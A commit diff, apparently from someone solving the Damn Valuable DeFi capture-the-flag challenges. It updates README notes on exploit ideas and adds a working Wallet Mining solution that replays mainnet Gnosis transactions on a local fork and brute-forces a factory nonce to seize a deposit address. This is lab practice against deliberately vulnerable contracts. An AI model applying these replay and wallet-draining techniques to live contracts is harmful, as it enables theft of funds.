4c922dd9b06cfc3005d074e6622a09317206b028
Mihail Feraru <mferaru@bitdefender.com>
2024-05-26 18:09:16 +0300

    WIP

--- README.md
+++ README.md
@@ -29,12 +29,11 @@ JS directly. exploit the lack of liquidity.
 checks if you have enough funds to buy all the NFTs using only the funds necessary to buy one;
 finllly, buy the tokens from yourself multiple times to exploit the bug again and drain the
 funds of the market; finally get the price; NICE
-11. [ ] Backdoor - **03h:00m** - WIP lots of time reading about solidity debugging, it's simply an awful experience;
-we can add a trusted module to the wallet at its creation and use that to drain the funds;
-12. [ ] Climber - **00h:35m** - WIP ClimberTimeLock execute calls before checking the if they are allowed
+11. [ ] Backdoor - **03h:00m** - WIP lots of time reading about solidity debugging, it's simply an awful experience; we can add a trusted module to the wallet at its creation and use that to drain the funds;
+12. [X] Climber - **01h:50m** - ClimberTimeLock execute calls before checking the if they are allowed
 to be executed, this can result in the manipulation of the state of the contract itself
-13. [ ] Wallet Mining - **00h:35m** - WIP we can control the target address of the newly deployed contract
-and we can target it at the DEPOSIT_ADDRESS
+13. [ ] Wallet Mining - **02h:35m** - WIP we can control the target address of the newly deployed contract
+and we can target it at the DEPOSIT_ADDRESS + replay attacks for the gnosis contracts
 14. [ ] Puppet V3 - **02h:15m** - WIP read about automatic market making, providing liquidity, impermanent loss, concentrated
 liquidity and other interesting stuff; read the paper on uniswap v1 and v3; price manipulation AGAIN.
 15. [X] ABI Smuggling - **03h:00** - mess up with the calldata layout, because execute() function loads the selector at a 
--- test/wallet-mining/wallet-mining.challenge.js
+++ test/wallet-mining/wallet-mining.challenge.js
@@ -5,13 +5,13 @@ describe('[Challenge] Wallet mining', function () {
     let deployer, player;
     let token, authorizer, walletDeployer;
     let initialWalletDeployerTokenBalance;
-    
+
     const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
     const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [ deployer, ward, player ] = await ethers.getSigners();
+        [deployer, ward, player] = await ethers.getSigners();
 
         // Deploy Damn Valuable Token contract
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
@@ -19,10 +19,10 @@ describe('[Challenge] Wallet mining', function () {
         // Deploy authorizer with the corresponding proxy
         authorizer = await upgrades.deployProxy(
             await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
-            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
+            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
             { kind: 'uups', initializer: 'init' }
         );
-        
+
         expect(await authorizer.owner()).to.eq(deployer.address);
         expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
         expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;
@@ -33,7 +33,7 @@ describe('[Challenge] Wallet mining', function () {
         );
         expect(await walletDeployer.chief()).to.eq(deployer.address);
         expect(await walletDeployer.gem()).to.eq(token.address);
-        
+
         // Set Authorizer in Safe Deployer
         await walletDeployer.rule(authorizer.address);
         expect(await walletDeployer.mom()).to.eq(authorizer.address);
@@ -43,7 +43,7 @@ describe('[Challenge] Wallet mining', function () {
 
         // Fund Safe Deployer with tokens
         initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
-        await token.transfer(
+        someTx = await token.transfer(
             walletDeployer.address,
             initialWalletDeployerTokenBalance
         );
@@ -66,6 +66,79 @@ describe('[Challenge] Wallet mining', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const mainnet = new ethers.providers.JsonRpcProvider(process.env.INFURA_URL);
+        async function replay(txHash) {
+            const tx = await mainnet.getTransaction(txHash);
+            const unsignedTx = {
+                to: tx.to,
+                nonce: tx.nonce,
+                gasLimit: tx.gasLimit,
+                gasPrice: tx.gasPrice,
+                data: tx.data,
+                value: tx.value,
+                chainId: tx.chainId
+            };
+            const signature = {
+                v: tx.v,
+                r: tx.r,
+                s: tx.s
+            }
+            await ethers.provider.send("hardhat_setBalance", [tx.from, "0x56BC75E2D63100000"]);
+
+            const serialized = ethers.utils.serializeTransaction(unsignedTx, signature);
+            await ethers.provider.sendTransaction(serialized)
+        }
+
+        const txs = [
+            "0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3",
+            "0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4",
+            "0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261"
+        ]
+
+        for (const txh of txs) {
+            await replay(txh);
+        }
+
+        console.log('replay done')
+
+        // nonce found 43
+        // let i = 0;
+        // while (true) {
+        //     const computedAddr = ethers.utils.getContractAddress({
+        //         from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
+        //         nonce: i,
+        //     });
+        //     if (computedAddr.toLowerCase() == DEPOSIT_ADDRESS) {
+        //         break;
+        //     }
+        //     i++;
+        //     console.log(i);
+        // }
+
+        const foundNonce = 43
+        const computedAddr = ethers.utils.getContractAddress({
+            from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
+            nonce: foundNonce,
+        });
+
+        if (computedAddr.toLocaleLowerCase() !== DEPOSIT_ADDRESS) {
+            throw new Error("invalid nonce!");
+        }
+
+        const factory = (
+            await ethers.getContractFactory("GnosisSafeProxyFactory")
+        ).attach("0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B");
+
+
+        for (let i = 0; i < foundNonce; i++) {
+            console.log('deploy wallet')
+            await factory.createProxy("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", [])
+        }
+
+        const tx = await factory.createProxy("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", [])
+        const receipt = await tx.wait()
+        console.log(receipt)
     });
 
     after(async function () {
@@ -85,7 +158,7 @@ describe('[Challenge] Wallet mining', function () {
         expect(
             await ethers.provider.getCode(DEPOSIT_ADDRESS)
         ).to.not.eq('0x');
-        
+
         // The deposit address and the Safe Deployer contract must not hold tokens
         expect(
             await token.balanceOf(DEPOSIT_ADDRESS)
@@ -97,6 +170,6 @@ describe('[Challenge] Wallet mining', function () {
         // Player must own all tokens
         expect(
             await token.balanceOf(player.address)
-        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
+        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
     });
 });
